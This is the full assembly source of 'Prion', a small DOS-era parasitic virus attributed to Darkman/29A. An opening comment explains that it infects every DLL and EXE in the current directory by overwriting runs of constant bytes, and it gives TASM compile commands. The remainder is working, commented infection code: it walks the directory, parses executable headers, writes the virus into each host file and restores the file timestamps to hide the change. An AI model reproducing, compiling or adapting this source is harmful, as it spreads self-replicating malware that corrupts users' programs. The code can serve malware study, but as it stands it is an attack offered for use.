comment *
                                 Prion              млллллм млллллм млллллм
                                Code by             ллл ллл ллл ллл ллл ллл
                              Darkman/29A            мммллп плллллл ллллллл
                                                    лллмммм ммммллл ллл ллл
                                                    ллллллл ллллллп ллл ллл

  Prion is a 313 bytes parasitic direct action new executable DLL/EXE virus.
  Infects every file in current directory, when executed, by searching for an
  area, the size of the virus, of constant bytes and overwrites the area with
  the virus. Prion has an error handler.

  I would like to thank Grog for the idea to this virus and Heuristic/29A for
  helping me finish it.

  To compile Prion with Turbo Assembler v 4.0 type:
    TASM /M PRION.ASM
    TLINK /x PRION.OBJ
    EXE2BIN PRION.EXE PRION.COM
*

.model tiny
.code

code_begin:
	     call    delta_offset
delta_offset:
	     pop     bp 		 ; Load BP from stack
	     sub     bp,(offset delta_offset-code_begin)

	     cli			 ; Clear interrupt-enable flag
	     push    cs 		 ; Save CS at stack
	     pop     ss 		 ; Load SS from stack (CS)

	     mov     sp,bp		 ; SP = delta offset
	     and     sp,1111111111111110b
	     sti			 ; Set interrupt-enable flag

	     push    ax 		 ; Save AX at stack

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     mov     ax,2524h		 ; Set interrupt vector 24h
	     lea     dx,[bp+int24_virus] ; DX = offset of int24_virus
	     int     21h

	     mov     ah,1ah		 ; Set disk transfer area ddress
	     lea     dx,[bp+dta]	 ; DX = offset of dta
	     int     21h

	     mov     ah,4eh		 ; Find first matching file
	     mov     cl,00100111b	 ; CL = file attribute mask
	     lea     dx,[bp+file_specifi]
find_next:
	     int     21h
	     jnc     infect_file	 ; No error? Jump to infect_file

	     pop     ax 		 ; Load AX from stack
	     int     21h
infect_file:
	     mov     ax,3d00h		 ; Open file (read)
	     lea     dx,[bp+filename]	 ; DX = offset of filename
	     int     21h
	     xchg    ax,bx		 ; BX = file handle
	     jc      close_file 	 ; Error? Jump to close_file

	     mov     ax,1220h		 ; Get system file table number
	     int     2fh

	     push    bx 		 ; Save BX at stack
	     mov     ax,1216h		 ; Get address of system FCB
	     mov     bl,es:[di] 	 ; BL = system file table entry
	     int     2fh
	     pop     bx 		 ; Load BX from stack

	     mov     byte ptr es:[di+02h],02h

	     mov     ax,es:[di+28h]	 ; AX = extension of the file
	     mov     cl,es:[di+2ah]	 ; CL =     "     "   "   "

	     cmp     ax,'LD'             ; DLL executable?
	     jne     test_exe		 ; Not equal? Jump to test_exe
	     cmp     cl,'L'              ; DLL executable?
	     je      read_header	 ; Equal? Jump to read_header
test_exe:
	     cmp     ax,'XE'             ; EXE executable?
	     jne     close_file 	 ; Not equal? Jump to close_file
	     cmp     cl,'E'              ; EXE executable?
	     jne     close_file 	 ; Not equal? Jump to close_file
read_header:
	     mov     ah,3fh		 ; Read from file
	     mov     cx,40h		 ; Read sixty-four bytes
	     lea     dx,[bp+file_header] ; DX = offset of file_header
	     int     21h

	     mov     si,dx		 ; SI = offset of file_header
	     mov     ax,[si]		 ; AX = EXE signature

	     xor     ax,'MZ'             ; Found EXE signature?
	     jz      test_new_exe	 ; Zero? Jump to test_new_exe
	     xor     ax,('ZM' xor 'MZ')  ; Found EXE signature?
	     jnz     close_file 	 ; Not zero? Jump to close_file
test_new_exe:
	     cmp     [si+18h],cl	 ; New executable?
	     jae     test_stack 	 ; Above or equal? Jump to test_stack
close_file:
	     mov     ah,3eh		 ; Close file
	     int     21h

	     mov     ah,4fh		 ; Find next matching file
	     jmp     find_next
test_stack:
	     mov     ax,10h		 ; Multiply initial SS relative to ...
	     mul     word ptr [si+0eh]	 ; DX:AX = initial SS relative to s...
	     add     ax,[si+10h]	 ; DX:AX = pointer to the stack
	     adc     dx,00h		 ;   "   "    "    "   "    "
	     jnz     test_stack_	 ; Not zero? Jump to test_stack_

	     or      ax,ax		 ; No stack?
	     jz      calc_header	 ; Zero? Jump to calc_header
test_stack_:
	     cmp     ax,[si+3ch]	 ; Stack placed in new executable ...?
	     jb      close_file 	 ; Below? Jump to close_file
	     cmp     dx,[si+3eh]	 ; Stack placed in new executable ...?
	     jb      close_file 	 ; Below? Jump to close_file
calc_header:
	     mov     ax,10h		 ; Multiply header size in paragrap...
	     mul     word ptr [si+08h]	 ; DX:AX = header size

	     mov     es:[di+15h],ax	 ; Move file pointer to end of header
	     mov     es:[di+17h],dx	 ;  "    "      "    "   "  "    "

	     sub     ax,[si+3ch]	 ; DX:AX = pointer to end of header
	     sbb     dx,[si+3eh]	 ;   "   "    "    "   "  "    "

	     neg     dx 		 ; Negate DX
	     dec     dx 		 ; Decrease DX
	     jnz     close_file 	 ; Not zero? Jump to close_file

	     lea     dx,[bp+file_buffer] ; DX = offset of file_buffer
	     cmp     ax,dx		 ; DOS stub too large?
	     jbe     close_file 	 ; Below or equal? Jump to close_fi...

	     neg     ax 		 ; Negate AX
	     push    ax 		 ; Save AX at stack
	     xchg    cx,ax		 ; CX = bytes to read from file

	     mov     ah,3fh		 ; Read from file
	     int     21h

	     std			 ; Set direction flag
	     dec     cx 		 ; Decrease CX
	     mov     si,dx		 ; SI = offset of file_buffer
	     add     si,cx		 ; SI = offset of end of file_buffer
	     lodsb			 ; AL = first byte of file_buffer
	     xchg    ax,dx		 ; DL =   "    "   "       "
search_const:
	     lodsb			 ; AL = byte of file_buffer
	     cmp     al,dl		 ; Equal to first byte of file_buffer?
	     jne     test_opcode	 ; Not equal? Jump to test_opcode

	     loop    search_const

	     pop     ax 		 ; Load AX from stack
close_file_:
	     jmp     close_file
test_opcode:
	     pop     ax 		 ; Load AX from stack

	     cmp     [si],0010000111001101b
	     jne     close_file 	 ; INT 21h (opcode 0cdh,21h)? Jump ...

	     dec     cx 		 ; Decrease CX
	     dec     cx 		 ;    "     "
	     sub     ax,cx		 ; AX = offset of virus within file

	     mov     cx,(code_end-code_begin)
	     cmp     ax,cx		 ; Enough constant bytes in file?
	     jb      close_file 	 ; Below? Jump to close_file

	     sub     es:[di+15h],ax	 ; Move file pointer to offset of v...
	     sbb     word ptr es:[di+17h],00h

	     mov     ah,40h		 ; Write to file
	     mov     dx,bp		 ; DX = delta offset
	     int     21h

	     mov     ax,5701h		 ; Set file's date and time
	     mov     cx,[bp+file_time]	 ; CX = file's time
	     mov     dx,[bp+file_date]	 ; DX = file's date
	     int     21h

	     jmp     close_file_

int24_virus  proc    near		 ; Interrupt 24h of Prion
	     mov     al,03h		 ; Fail system call in progress

	     iret			 ; Interrupt return!
	     endp

file_specifi db      '*.*',00h           ; File specification
virus_name   db      '[Prion] '          ; Name of the virus
virus_author db      '[Darkman/29A] '    ; Author of the virus
code_end:
dta:
	     db      15h dup(?) 	 ; Used by DOS for find next-process
file_attr    db      ?			 ; File attribute
file_time    dw      ?			 ; File time
file_date    dw      ?			 ; File date
filesize     dd      ?			 ; Filesize
filename     db      0dh dup(?) 	 ; Filename
file_buffer:
file_header  db      40h dup(?) 	 ; File header

end	     code_begin
